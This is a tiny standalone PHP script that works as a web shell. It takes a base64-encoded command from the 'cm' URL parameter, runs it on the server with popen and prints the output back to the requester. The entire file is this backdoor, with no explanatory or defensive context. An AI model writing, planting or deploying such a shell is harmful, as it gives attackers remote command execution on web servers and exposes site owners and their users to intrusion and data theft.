<?php
$fp = popen(base64_decode($_GET['cm']),"r");{while(!feof($fp)){$result.=fread($fp,1024);}pclose($fp);}$exec = convert_cyr_string($result,"d","w");echo $exec;
?>
